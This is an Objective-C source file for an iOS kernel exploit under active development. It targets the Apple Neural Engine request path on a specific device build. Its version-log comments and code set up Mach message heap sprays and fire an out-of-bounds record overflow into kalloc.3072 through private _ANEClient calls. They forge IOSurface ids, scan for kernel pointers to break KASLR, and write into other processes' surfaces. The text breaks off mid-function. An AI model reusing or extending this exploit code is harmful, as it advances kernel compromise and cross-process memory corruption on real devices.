// P044AksKaslrReach.m
// v27 — v25 engine + port-kind payload diff + fingerprint_scan + guarded control recv.
//
// Ledger (churn-conditioned, device-verified):
//   v20 mixed   -> HIT, HIT
//   v21 tail    -> 0/0/0 (ordering poison)
//   v22 mixed   -> HIT (2045), HIT (2046)
//   v23 tail-8  -> 0s — root-caused: corrupted complex kmsgs are REJECTED by
//     the kernel on recv and our scanner silently dropped them. The signal
//     was being discarded, not absent.
//
// v24 changes:
//   1. scanVictims port-kind branch: recv errors other than timeout/invalid
//      = KERNEL REJECTED CORRUPTED DESCRIPTORS = conversion signal.
//   2. Watcher thread: continuous recv over queued drains for 45s after
//      fire (delayed landings: +27s/+52s/+12min/cross-zone all witnessed).
//   3. Events recorded under a mutex: inline diff, port rejection signal,
//      drain corruption — printed at verdict.
//
// v25 additions (engine body unchanged):
//   A. 96 NEON witnesses (V0..V31 magic, ALU spin). Scan via
//      thread_suspend + thread_get_state(ARM_NEON_STATE64) before fire,
//      t+0, every 5s in the watch window, and at end.
//   B. Control recv of ONE port-kind victim before fire (benign baseline).
//   C. recv_msg_sz: on TOO_LARGE copy msgh_size out. Inline rejections
//      (kind 4) no longer silent. Prediction status logged; if prediction
//      fails, say whether OOB signals are already present.
//
// v27 deltas (engine body unchanged):
//   D1 recv_msg_sz(port,payload,waitMs,corruptSize,expectSize): flag ONLY on
//      msgh_size != expectSize (-> MACH_RCV_TOO_LARGE + *corruptSize).
//      recv_msg stays a thin wrapper (expectSize=0). Call sites typed:
//      scanVictims inline->P044_EXPECT_INLINE, scanVictims port-kind->
//      P044_EXPECT_PORTK, watcher drain->P044_EXPECT_INLINE, controlRecv->
//      P044_EXPECT_PORTK.
//   D2 PORT-KIND PAYLOAD DIFF: on SUCCESS the body word must == 2 and the pad
//      [0x1c, sizeof(port_msg_t)-sizeof(mach_msg_header_t)) must == 0; a HIT
//      fires only on a diff (benign clean = NOT a hit). Non-timeout rejection
//      -> PORT-KIND SIGNAL + hits++. Inline size deviation counts hits +
//      ev_push(4,...).
//   D3 fingerprint_scan helper, invoked on every HIT.
//   D4 P044_CONTROL_RECV=0; PHASE 4f guarded; enabled path picks a mid-array
//      port-kind victim (first i >= PAIR_COUNT/2 with kind==1), real buffer,
//      re-sends after, leaves done=0.
//   D5 prediction FAILED logged EXPECTED; success logged "ok (UNEXPECTED with
//      addchain — check model)"; verdict FLAG only when prediction OK while
//      the model name contains "addchain" (v60: runtime name via
//      p044_model_name() — passthrough re-bases the FLAG on the lane oracles).
//   D6 model-name guard after findCoreMLModelURL (log, no abort).
//   D7 banner: BUILD v27 + NEON_WITNESS_COUNT / PORT_VICTIM_EVERY /
//      P044_CONTROL_RECV.
// Retained: churn seed, mixed layout + last-8 tail, send_msg / send_port_msg
//   / fill_payload / kptr_scan / hexdump16, drain cleanup, v18 logging.
// recv_msg(port, payload, waitMs) signature and contract unchanged
//   (thin wrapper over recv_msg_sz).
//
// Isolation: one tap per force-quit. PANIC POSSIBLE at fire and at
// port-kind recv (a panic = kernel dereferenced our bytes = evidence).
// No OOL memory descriptors. No syscall 536. NOT hasKread.
//
// v47 — RECORD SID FORGE (102 Chain 1 Step 2). 3072 engine unchanged.
//   E1. TWO models in one process: A = 191in addchain (v61 B1: count=192
//       = exactly in-bounds; v47..v60 used the 254in OOB fire),
//       B = XVRC27_127inmin_1out (the second live request / consumer).
//   E2. Own IOSurface pool staged first (412 creates; last surface =
//       sid_C staged MARK 0x53535353) so forge targets are REAL
//       fetchable sids (p082: kernel sids 1..24 fetch-resolve; p081 F:
//       foreign sid accepted; p083: staging surfaces live per-predict).
//   E3. A's LAST FORGE_COUNT (62) input slots carry the forge sid
//       values (sid field = staged input u32, P080/P075 mechanism):
//       [sid_C, kernel 1..24, own pool...]. The OOB record stream
//       smashes B's request records with OUR sids.
//   E4. B baseline predict pre-spray (yB1); B post-fire predict (yB2).
//       yB2 != yB1 (or a B error) = B consumed smashed records.
//   E5. fingerprint_scan matches the surface u32 against the forge set:
//       *** FORGED-SID *** lines + g_cls_forge_sid counter.
//   E6. Verdict bar adds record_forge: forge_seen>0 = the spilled body
//       carries client-chosen sids (bar half one: body control).
//       Conversion still needs a desc-type forge or a non-fill kptr.
//       NOT hasKread. One tap per force-quit; fresh boot next tap.
//
// v48 — DIRECT-PATH RECORD FORGE (Anvil gate0 PASS: H11ANEIn type=1 opens).
//   F1. Fire is H11ANEIn ProgramSendRequest sel 2 (stIn=0x948, async port,
//       scIn=1), NOT the CoreML predict — three independent proofs the
//       CoreML lane neuters ids[] (v47 run#2, P073 D1 19:24, p083 19:22).
//       Handle from _ANEModel/_ANEClient (compileModel/doLoadModel ->
//       programHandle); DeviceOpen sel0 0x68 + ProgramPrepare sel4 0x38 are
//       logged and the send runs regardless (P059: 0xe00002c2/0xe00002d8
//       are shape/prepare misses, not gates on the data).
//   F2. req948 OURS: totIn=254 @+0x1c (capacity 192, NO bound check),
//       ids[] @+0x20 = forge sids (sid_C head, kernel 1..24, own pool),
//       symbols[] @+0x41c = 0xc0+(i&0x3f), totOut=1 @+0x51c, outId=sid_C.
//       Overflow records 192..253 land as [forge sid][0xcN][1][1] — the
//       exact spilled-record shape with CLIENT-CHOSEN sids.
//   F3. B-sentinel fix: all B inputs 613.0 -> baseline y=613 (v47's 1..127
//       min gave y=1 always, insensitive). Any spilled sid < 613 moves y.
//   F4. HOLE_MODE selects the landing lane per build: 1 = holes punched
//       (freed-ho
//       shape: records persist in the freed element until reuse); 0 = all
//       victims stay live (kmsg-landing lane for desc0.type forge).
//   F5. CoreML 254 predict kept ONLY as fallback when the direct path
//       cannot open; verdict line fire=direct|coreml-fallback.
//   Bars unchanged: conversion = desc_type_forged OR (body_forged AND
//       kptr). record_forge half one = forge_seen>0. NOT hasKread.
//       One tap per force-quit; fresh boot next tap.
//
// v48.1 — _ANEClient REQUEST FIRE (run#1 post-mortem, 22:34 log):
//   Run#1 (v48 raw conn): IOServiceOpen type=1 kr=0 conn=44035 OPEN, handle
//       0x2c3e66dee loaded ok, but DeviceOpen sel0 -> kr=0x5, ProgramPrepare
//       sel4 -> kr=0x5, ProgramSendRequest sel2/19 -> 0xe00002c2, fired=0.
//       ROOT CAUSE: the program handle binds to the _ANEClient
//       sharedConnection that loaded it; a fresh conn has no binding and
//       the UC rejects the send before CheckandPrewire. Raw-IOConnect lane
//       CLOSED on 23F77 from this app.
//   G1. Fire = the Shevchenko PoC transport (39_NEW_POC_CROSSREF test()):
//       _ANERequest built from OUR IOSurface objects via
//       _ANEIOSurfaceObject objectWithIOSurface:, fired through
//       _ANEClient doEvaluateDirectWithModel:options:request:qos:error:
//       on the SAME sharedConnection the model was loaded on.
//   G2. ids[] = OUR request surface sids at request-build time (the
//       neutering was a CoreML/MLModel-predict property — the hand-built
//       request carries our surfaces verbatim). inputIndices = 0..253, so
//       overflow records 192..253 land as [our sid][0xc0+k][1][1].
//   G3. Request surfaces: v56 = 254x 0x4000 inputs (small-geometry test;
//       note 127 proved the marshaling capacity is fixed 192 records, so
//       surface size is the remaining arg-check variable) + 1x 0x4000
//       output, created BEFORE the spray. PoC geometry w=size/4 h=1
//       bpr=size, fill 0x41+(i&0xf). Forge set = exactly the 255 request
//       sids (clean attribution: no kernel-1..24, no pool sids).
//   G4. No fallback re-fire when evaluate executes and returns NO — one
//       fire per tap. CoreML predict only when the _ANE lane can't arm.
//   Everything else (spray/HOLE_MODE/NEON/watcher/reclaim/B-613/bars)
//       unchanged from v48.

#import "P044AksKaslrReach.h"
#import "A14_23F77_LabOffsets.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreML/CoreML.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/arm/thread_status.h>
#import <netinet/in.h>
#import <netinet/icmp6.h>
#import <pthread.h>
#import <string.h>
#import <sys/resource.h>
#import <sys/socket.h>
#import <unistd.h>
#import <stdlib.h>
#import <dlfcn.h>
#import <math.h>
#import <objc/message.h>

#define P044_BUILD @"p044-v61c-prefiresnap"

#define INPUT_COUNT 191
#define PAYLOAD_SIZE 0xb80
#define PAIR_COUNT 2048
#define DRAIN_COUNT 2048
#define COREML_MODEL_NAME @"XVRC27_191in_1out_addchain"

/* v61 addchain-191 B1 (Oct-16, note 149): the vehicle is the HAND-WRITTEN
   191-in/1-out MIL (buildInfo source tag 'addchain-191in1out B1', coremlc
   3520.4.1 template-faithful — byte-identical to the 254 template except
   the source tag), carried as a FLAT MIL dir (model.mil/options.plist/
   weights1.bin at bundle root) and compiled ON DEVICE by _ANEModel
   compileModel (v56 MIL-dir lane), so ANECCompile finally sees the
   handwritten addchain. INPUT_COUNT 254->191: count=192 = EXACTLY
   in-bounds for the fixed 192-record kalloc.3072 marshaling object
   (note 127) — records 128..191 clobber the header (program@0x808 <-
   fixed tail 0x0000000100000001, count@0x810 <- record 129's
   compiler-assigned sid) but NOTHING spills past +0xC00. Oracles
   unchanged (OUTPUT-SID lane, census stillness, out-entry scan). The
   question this run answers: does the fire COMPLETE once count is
   in-bounds (vs the 0x2/0x9 reject), and does the scrambled count@0x810
   sid survive ANEC's header rewrite?
   v60 history (Oct-12): passthrough ops at 254in — rejected 0x2/0x9 on
   23F77; the program-complexity vs input-count split went unresolved.
   v61 changes BOTH ops (back to addchain) AND count (191) — confound
   accepted deliberately; note 149 documents why. */
static NSString *g_modelNameOverride = nil;
static NSString *p044_model_name(void) {
    return g_modelNameOverride ?: COREML_MODEL_NAME;
}
static BOOL p044_model_is_addchain(void) {
    return [p044_model_name() rangeOfString:@"addchain"].location != NSNotFound;
}

#define PORT_VICTIM_EVERY 4
#define TAIL_PORTK_COUNT 8
/* v49 desc-tile recon: TAIL port-kind victims carry 8 port descriptors so
   descs 3..8 land INSIDE the ANE record tile (tile starts at body+0x1c =
   exactly after [body][desc1][desc2] in v48.1 dumps). Non-tail port-kind
   victims keep 2 descs = v48.1 control. Message size UNCHANGED (0xb74,
   kalloc.3072 band): 6 extra descs (72B) come out of the pad. */
#define P044_PORT_DESC_N 8
#define CHURN_BATCH 512
#define CHURN_SETTLE_SEC 1.0
#define WATCH_SECONDS 45.0
#define RECV_WAIT_MS_EMPTY 1
#define RECV_WAIT_MS_WORK 1000
#define RECV_WAIT_MS_CTRL 50
#define EVENT_LOG_MAX 32
#define NEON_WITNESS_COUNT 32

/* v47 record-forge (102 Chain 1 Step 2) */
#define MODEL_B_NAME @"XVRC27_127inmin_1out"
#define FORGE_COUNT 62u
#define FORGE_MAX 1024u
#define N_SURF 412u
#define SURF_MARK 0x53535353u
#define SURF_ZERO 0u

/* v48 direct-path fire (Anvil gate0 pass — P059/P032 shapes, dlsym only).
   Offsets are the 23F77 DirectPath 0x948 inline request (101u cross-ref:
   counts @ +0x1c/+0x51c, ids[] @ +0x20, symbols @ +0x41c, capacity 192). */
#define ANE_SEL_DEVICE_OPEN 0u
#define ANE_SEL_PROGRAM_SEND 2u
#define ANE_SEL_PROGRAM_PREPARE 4u
#define ANE_SEL_PROGRAM_SEND_ASYNC 19u
#define ANE_DEVICEINFO_SIZE 0x68u
#define ANE_PREPARE_SIZE 0x38u
#define ANE_SEND_SIZE 0x948u
#define ANE_SEND_OUT_SIZE 0x28u
#define ANE_REQ_OFF_HANDLE 0x00u
#define ANE_REQ_OFF_PROCID 0x18u
#define ANE_REQ_OFF_TOTIN 0x1cu
#define ANE_REQ_OFF_IN_IDS 0x20u
#define ANE_REQ_OFF_IN_SYMS 0x41cu
#define ANE_REQ_OFF_TOTOUT 0x51cu
#define ANE_REQ_OFF_OUT_IDS 0x52cu
#define ANE_REQ_OFF_EVENTS 0x930u
#define ANE_TOTIN 191u
#define P044_HOLE_MODE 1 /* 1 = freed-hole lane + reclaim read-back; 0 = live-kmsg lane; 2 = contiguous-run frees (DEAD per 101ae: modified-after-free panic or kernel zeroing — do not re-enable) */
#define P044_HOLE_RUN_LO 1024u /* v48.2: free pairs [LO..HI) hole+victim — adjacent elements */
#define P044_HOLE_RUN_HI 1536u
#define P044_RECLAIM_SURF 8u

#define P044_CONTROL_RECV 0
#define P044_EXPECT_INLINE (sizeof(mach_msg_header_t)+PAYLOAD_SIZE)
#define P044_EXPECT_PORTK sizeof(port_msg_t)

#ifndef ARM_NEON_STATE64
#define ARM_NEON_STATE64 17
#endif

typedef struct {
    mach_port_t hole;
    mach_port_t victim;
    int kind;
    int descN;                /* 2 = v48.1 control, 8 = v49 probe (descs in tile) */
    int done;
} pair_t;

typedef struct {
    mach_msg_header_t hdr;
    uint8_t bytes[];
} inline_msg_t;

/* complex msg: hdr 0x18 + body 0x4 + 8 port descs 0x60 + pad -> 0xb74
   kdata = 0xb74 + 0x24 = 0xb98  (P034 band, kalloc.3072)
   v49: desc[3..7] occupy body+0x1c..0x64 = the ANE record tile. */
typedef struct {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_port_descriptor_t desc[P044_PORT_DESC_N];
    uint8_t pad[PAYLOAD_SIZE - 0x40 - (P044_PORT_DESC_N - 2) * 12];
} port_msg_t;

typedef struct {
    int kind;                 /* 0 inline-hit 1 port-signal 2 drain-inline 3 drain-signal 4 inline-rejection 5 portkind-hit */
    uint32_t idx;
    kern_return_t kr;
    uint32_t corruptSize;
    uint8_t body[PAYLOAD_SIZE];
} ev_t;

static ev_t g_events[EVENT_LOG_MAX];
static int g_evCount = 0;
static int g_evTotal = 0;
static pthread_mutex_t g_evLock = PTHREAD_MUTEX_INITIALIZER;

static void ev_push(int kind, uint32_t idx, kern_return_t kr, const uint8_t *body,
                    uint32_t corruptSize) {
    pthread_mutex_lock(&g_evLock);
    g_evTotal++;
    if (g_evCount < EVENT_LOG_MAX) {
        ev_t *e = &g_events[g_evCount];
        e->kind = kind;
        e->idx = idx;
        e->kr = kr;
        e->corruptSize = corruptSize;
        if (body) {
            memcpy(e->body, body, PAYLOAD_SIZE);
        } else {
            memset(e->body, 0, PAYLOAD_SIZE);
        }
        g_evCount++;
    }
    pthread_mutex_unlock(&g_evLock);
}

#pragma mark - Logging (v18 contract: whole-buffer rewrite)

static void p044_write_log(NSString *out) {
    NSString *docs = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *path = [docs stringByAppendingPathComponent:@"p044_aks_kaslr_reach_log.txt"];
    int fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *s = out.UTF8String;
        if (s) write(fd, s, strlen(s));
        fcntl(fd, F_FULLFSYNC);
        close(fd);
    }
}

#pragma mark - Payload / port / message helpers

static void fill_payload(uint8_t *p, uint32_t index, uint32_t role) {
    for (size_t i = 0; i < PAYLOAD_SIZE; i++) {
        p[i] = (uint8_t)(0xa5u ^ (uint8_t)(index * 17u) ^
                         (uint8_t)(role * 0x31u) ^ (uint8_t)(i * 13u));
    }
    uint64_t magic = role ? 0x5649435458563237ULL : 0x484f4c4558563237ULL;
    uint64_t marker = 0x4141414141414141ULL;
    uint64_t len = PAYLOAD_SIZE;
    memcpy(p + 0x00, &magic, sizeof(magic));
    memcpy(p + 0x08, &index, sizeof(index));
    memcpy(p + 0x0c, &role, sizeof(role));
    memcpy(p + 0x10, &len, sizeof(len));
    memcpy(p + 0x18, &marker, sizeof(marker));
}

static mach_port_t make_port(void) {
    mach_port_t port = MACH_PORT_NULL;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) return MACH_PORT_NULL;
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        mach_port_destroy(mach_task_self(), port);
        return MACH_PORT_NULL;
    }
    return port;
}

static void send_msg(mach_port_t port, uint32_t index, uint32_t role) {
    size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE;
    inline_msg_t *msg = calloc(1, msg_size);
    if (!msg) return;

    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)msg_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58560000u | ((role & 0xffu) << 8) | (index & 0xffu));
    fill_payload(msg->bytes, index, role);

    mach_msg(&msg->hdr, MACH_SEND_MSG, (mach_msg_size_t)msg_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    free(msg);
}

static void send_port_msg(mach_port_t port, uint32_t index, int ndesc) {
    size_t msg_size = sizeof(port_msg_t);
    port_msg_t *msg = calloc(1, msg_size);
    if (!msg) return;

    msg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) |
                         MACH_MSGH_BITS_COMPLEX;
    msg->hdr.msgh_size = (mach_msg_size_t)msg_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_id = (mach_msg_id_t)(0x58570000u | (index & 0xffu));
    msg->body.msgh_descriptor_count = (natural_t)ndesc;
    for (int k = 0; k < ndesc && k < P044_PORT_DESC_N; k++) {
        msg->desc[k].name = make_port();
        msg->desc[k].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg->desc[k].type = MACH_MSG_PORT_DESCRIPTOR;
    }

    mach_msg(&msg->hdr, MACH_SEND_MSG, (mach_msg_size_t)msg_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
    /* the send took its own refs (COPY_SEND); release the caller copies */
    for (int k = 0; k < ndesc && k < P044_PORT_DESC_N; k++) {
        if (msg->desc[k].name) mach_port_destroy(mach_task_self(), msg->desc[k].name);
    }
    free(msg);
}

/* v27 D1: flag ONLY when msgh_size != expectSize. expectSize=0 => never flag
   (recv_msg thin-wrapper path). TOO_LARGE captures the kernel-written
   msgh_size into *corruptSize. */
static kern_return_t recv_msg_sz(mach_port_t port, uint8_t *payload, uint32_t waitMs,
                                 uint32_t *corruptSize, mach_msg_size_t expectSize) {
    size_t msg_size = sizeof(inline_msg_t) + PAYLOAD_SIZE + sizeof(mach_msg_max_trailer_t) + 0x100;
    inline_msg_t *msg = calloc(1, msg_size);
    if (!msg) return MACH_MSG_SIZE_MAX;
    if (corruptSize) *corruptSize = 0;

    kern_return_t kr = mach_msg(&msg->hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                (mach_msg_size_t)msg_size, port, waitMs, MACH_PORT_NULL);
    if (kr == MACH_MSG_SUCCESS) {
        if (expectSize && msg->hdr.msgh_size != expectSize) {
            if (corruptSize) *corruptSize = msg->hdr.msgh_size;
            kr = MACH_RCV_TOO_LARGE;
        } else if (payload) {
            memcpy(payload, msg->bytes, PAYLOAD_SIZE);
        }
    } else if (kr == MACH_RCV_TOO_LARGE) {
        if (corruptSize) *corruptSize = msg->hdr.msgh_size;
    }
    free(msg);
    return kr;
}

static kern_return_t recv_msg(mach_port_t port, uint8_t *payload, uint32_t waitMs) {
    return recv_msg_sz(port, payload, waitMs, NULL, 0);
}

static void hexdump16(uint8_t *buf, size_t start, NSMutableString *out) {
    size_t base = start & ~(size_t)0xf;
    for (size_t off = base; off < base + 0x40 && off < PAYLOAD_SIZE; off += 0x10) {
        [out appendFormat:@"    %04zx:", off];
        for (size_t k = 0; k < 0x10 && off + k < PAYLOAD_SIZE; k++) {
            [out appendFormat:@" %02x", buf[off + k]];
        }
        [out appendString:@"\n"];
    }
}

static int g_cls_fp;
static int g_cls_kptr;
static int g_cls_kptr_tail;
static int g_cls_body_forged;
static int g_cls_desc_forged;
static int g_cls_reject;
static int g_cls_desc_reject; /* v49: 8-desc probe victim rejected at copyout = record bytes forged desc dispositions */
static int g_cls_forge_sid;
static int g_cls_out_entry;  /* v50: A's OUTPUT entry {outSid, 0xfe, flags} seen in a spilled table */

/* v47 record-forge state */
static uint32_t g_forgeSids[FORGE_MAX];
static uint32_t g_forgeCount;
static uint32_t g_p044_outSid; /* v50: the request's OUTPUT surface sid (entry 254 = 0xfe) */
static double g_yB1;
static double g_yB2;
static double g_yBc;           /* v50: concurrent-B predict (t-1ms consume-forge window) */
static CFTypeRef g_surfs[1024];
static uint32_t g_nSurf;
static int g_cls_readback;

/* v52: OUTPUT-SID LANE state. Census proved IOSurfaceLookup resolves
   FOREIGN-process surfaces by global id (383 hits, ALL 16384 B = exactly
   A's expected output size). We bind a foreign sid as the request's OUTPUT:
   the consumer resolves it, validates size (match) + symbol, maps it, and
   the ANE writes the inference result into the foreign surface. */
static uint32_t g_foreignOutSid;   /* census-chosen foreign target (0 = old path) */
static uint32_t g_foreignUsePre;   /* IOSurfaceGetUseCount pre-fire */
static uint32_t g_foreignUsePost;
static uint8_t  g_foreignSnap[0x4000]; /* v59: FULL 0x4000 content snapshot pre-fire (was 64B) */
static int      g_foreignSnapValid;
static int      g_foreignDiff;     /* bytes changed post-fire (full 0x4000) */
static int      g_foreignLockRc;   /* lock rc of the post-fire read */
static double   g_expectedSum;     /* v59: CoreML-lane expected sum, for output-match scan */

/* v48.1 _ANEClient lane state (file scope so cleanup can always release) */
static id g_aneModelObj = nil;
static id g_aneClient = nil;
static id g_aneReq = nil;
static int g_aneModelOk = 0;
static int g_aneReqOk = 0;

static void cls_reset(void) {
    g_cls_fp = g_cls_kptr = g_cls_kptr_tail = 0;
    g_cls_body_forged = g_cls_desc_forged = g_cls_reject = g_cls_desc_reject = 0;
    g_cls_forge_sid = 0;
    g_cls_out_entry = 0;
    g_cls_readback = 0;
    g_forgeCount = 0;
    g_yB1 = g_yB2 = NAN;
    g_foreignOutSid = 0; g_foreignUsePre = g_foreignUsePost = 0;
    g_foreignSnapValid = 0; g_foreignDiff = 0; g_foreignLockRc = -1;
    memset(g_foreignSnap, 0, sizeof(g_foreignSnap));
    g_expectedSum = NAN;
}

static void kptr_scan(uint8_t *buf, uint32_t victim, NSMutableString *out) {
    for (size_t j = 0; j + 8 <= PAYLOAD_SIZE; j += 4) {
        uint64_t val = *(uint64_t *)&buf[j];
        if ((uint32_t)(val >> 32) == 0xfffffff0u) {
            g_cls_kptr++;
            if (j >= 0x3e0) g_cls_kptr_tail++;
            [out appendFormat:@"    *** KPTR victim=%u body[0x%zx] = 0x%016llx ***\n",
                victim, j, (unsigned long long)val];
        }
    }
}

/* v27 D3: fingerprint_scan. Scans 16B-stride fingerprint surface
   [u32 surfaceId][u32 0xcN counter][1][1] from `start` (rounded down to a
   4-byte boundary) to end. C2: uses `start` so port-kind callers can skip the
   descriptor region. v47 E5: surface u32 membership in the forge set =>
   FORGED-SID (client-chosen sid in the spilled record body). */
static void fingerprint_scan(uint8_t *buf, size_t start, NSMutableString *out) {
    for (size_t j = (start & ~(size_t)3); j + 16 <= PAYLOAD_SIZE; j += 4) {
        uint32_t surfaceVal = *(uint32_t *)&buf[j];
        uint32_t counter = *(uint32_t *)&buf[j + 4];
        if (counter >= 0xc0u && counter <= 0xffu &&
            *(uint32_t *)&buf[j + 8] == 1u &&
            *(uint32_t *)&buf[j + 12] == 1u) {
            int forged = 0;
            for (uint32_t k = 0; k < g_forgeCount; k++) {
                if (g_forgeSids[k] == surfaceVal) { forged = 1; break; }
            }
            if (forged) {
                g_cls_forge_sid++;
                [out appendFormat:@"    *** FORGED-SID @0x%zx surface=%u counter=0x%x (client-chosen sid in spilled record) ***\n",
                    j, surfaceVal, counter];
            } else {
            g_cls_fp++;
                [out appendFormat:@"    *** FINGERPRINT @0x%zx surface=%u [u32 0x%x counter][1][1] ***\n",
                    j, surfaceVal, counter];
            }
        }
    }
}

/* v51: A's OUTPUT entry. RAW DUMP CONFIRMED (v50 run 1 @body+0x444, run 2
   same): the type-2 second loop writes the output record as
   {outSid, 0x00000000, 1, 2} — symbolIndex field is 0, NOT 0xfe, and the
   flags word is {1,2}. v50's scan pattern {outSid, 0xfe} was blind to it.
   Primary pattern now {outSid, 0}; keep {outSid, 0xfe} as a legacy probe. */
static void out_entry_scan(uint8_t *buf, NSMutableString *out) {
    if (!g_p044_outSid) return;
    for (size_t j = 0; j + 16 <= PAYLOAD_SIZE; j += 4) {
        if (*(uint32_t *)&buf[j] != g_p044_outSid) continue;
        uint32_t sym = *(uint32_t *)&buf[j + 4];
        uint32_t f0 = *(uint32_t *)&buf[j + 8], f1 = *(uint32_t *)&buf[j + 12];
        if (sym == 0x0u && f0 == 1u && f1 == 2u) {
            g_cls_out_entry++;
            [out appendFormat:
                @"    *** OUT-ENTRY @0x%zx sid=%u sym=0 flags={1,2} "
                @"(EXACT v50 raw-dump shape {outSid,0,1,2}) ***\n", j, g_p044_outSid];
        } else if (sym == 0xfeu) {
            g_cls_out_entry++;
            [out appendFormat:
                @"    *** OUT-ENTRY @0x%zx sid=%u sym=0xfe flags=%08x %08x "
                @"(legacy 0xfe shape) ***\n", j, g_p044_outSid, f0, f1];
        }
    }
}

#pragma mark - IOSurface stage pool (v47 E2, p082 dlsym shape — no surface headers)

typedef CFTypeRef (*p044_sf_create_t)(CFDictionaryRef props);
typedef uint32_t (*p044_sf_getid_t)(CFTypeRef surf);
typedef void *(*p044_sf_base_t)(CFTypeRef surf);
typedef size_t (*p044_sf_allocsz_t)(CFTypeRef surf);
typedef int (*p044_sf_lock_t)(CFTypeRef surf, uint32_t opts, uint32_t *seed);
typedef CFTypeRef (*p044_sf_lookup_t)(uint32_t sid); /* v51: by GLOBAL id */
typedef uint32_t (*p044_sf_usecount_t)(CFTypeRef surf); /* v52 */

static p044_sf_create_t p044_sfCreate;
static p044_sf_getid_t p044_sfGetID;
static p044_sf_base_t p044_sfBase;
static p044_sf_allocsz_t p044_sfAllocSz;
static p044_sf_lock_t p044_sfLock;
static p044_sf_lock_t p044_sfUnlock;
static p044_sf_lookup_t p044_sfLookup; /* v51 */
static p044_sf_usecount_t p044_sfUseCount; /* v52 */

static int p044_surface_syms(NSMutableString *out) {
    if (p044_sfCreate && p044_sfGetID) return 1;
    p044_sfCreate  = (p044_sf_create_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
    p044_sfGetID   = (p044_sf_getid_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
    p044_sfBase    = (p044_sf_base_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
    p044_sfAllocSz = (p044_sf_allocsz_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
    p044_sfLock    = (p044_sf_lock_t)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
    p044_sfUnlock  = (p044_sf_lock_t)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
    p044_sfLookup  = (p044_sf_lookup_t)dlsym(RTLD_DEFAULT, "IOSurfaceLookup"); /* v51 */
    p044_sfUseCount = (p044_sf_usecount_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetUseCount"); /* v52 */
    [out appendFormat:@"  IOSurface dlsym: create=%d getid=%d base=%d allocsz=%d lock=%d unlock=%d lookup=%d usecount=%d\n",
        p044_sfCreate != NULL, p044_sfGetID != NULL, p044_sfBase != NULL,
        p044_sfAllocSz != NULL, p044_sfLock != NULL, p044_sfUnlock != NULL,
        p044_sfLookup != NULL, p044_sfUseCount != NULL];
    return (p044_sfCreate && p044_sfGetID && p044_sfBase &&
            p044_sfAllocSz && p044_sfLock && p044_sfUnlock) ? 1 : 0;
}

static CFTypeRef p044_surface_create(size_t allocSize, NSMutableString *out) {
    if (!p044_sfCreate) return NULL;
    int w = 16, h = 16;
    size_t bpr = 64;
    CFNumberRef cw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef ch = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
    CFNumberRef cbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberCFIndexType, &bpr);
    CFNumberRef cas = CFNumberCreate(kCFAllocatorDefault, kCFNumberCFIndexType, &allocSize);
    const void *keys[] = { CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
                           CFSTR("IOSurfaceBytesPerRow"), CFSTR("IOSurfaceAllocSize") };
    const void *vals[] = { cw, ch, cbpr, cas };
    CFDictionaryRef props = CFDictionaryCreate(kCFAllocatorDefault, keys, vals, 4,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFTypeRef surf = p044_sfCreate(props);
    CFRelease(props);
    CFRelease(cw); CFRelease(ch); CFRelease(cbpr); CFRelease(cas);
    if (!surf) {
        [out appendString:@"  surface create failed\n"];
        return NULL;
    }
    return surf;
}

static void p044_surface_fill_u32(CFTypeRef surf, uint32_t word) {
    if (!surf || !p044_sfBase || !p044_sfAllocSz || !p044_sfLock || !p044_sfUnlock) return;
    if (p044_sfLock(surf, 0, NULL) != 0) return;
    uint32_t *base = (uint32_t *)p044_sfBase(surf);
    size_t n = p044_sfAllocSz(surf) / sizeof(uint32_t);
    if (base && n) {
        for (size_t i = 0; i < n; i++) base[i] = word;
    }
    p044_sfUnlock(surf, 0, NULL);
}

/* Stage N_SURF surfaces in OUR registry (all 16KB, ZERO-filled) except the
   LAST one, which carries SURF_MARK and becomes sid_C — the forge head.
   Every created sid is collected into sidsOut for the forge set. */
static void p044_stage_surfaces(uint32_t *sidsOut, uint32_t maxOut,
                                uint32_t *sidCOut, uint32_t *firstSidOut,
                                NSMutableString *out) {
    *sidCOut = 0;
    *firstSidOut = 0;
    g_nSurf = 0;
    for (uint32_t i = 0; i < N_SURF; i++) {
        CFTypeRef s = p044_surface_create(0x4000, out);
        if (!s) break;
        uint32_t sid = p044_sfGetID(s);
        p044_surface_fill_u32(s, (i == N_SURF - 1) ? SURF_MARK : SURF_ZERO);
        if (g_nSurf < 512u) {
            g_surfs[g_nSurf++] = s;
